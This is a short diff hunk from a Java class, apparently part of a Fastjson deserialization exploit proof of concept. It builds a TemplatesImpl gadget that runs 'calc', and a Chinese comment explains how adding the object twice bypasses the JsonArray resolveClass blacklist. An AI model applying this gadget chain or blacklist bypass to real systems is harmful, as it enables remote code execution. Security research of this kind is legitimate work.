@@ -38,7 +38,7 @@ public class FJ2 {
 
         List<Object> list = new ArrayList<>();
 
-        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows();
+        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows("calc");
 
         list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测
 
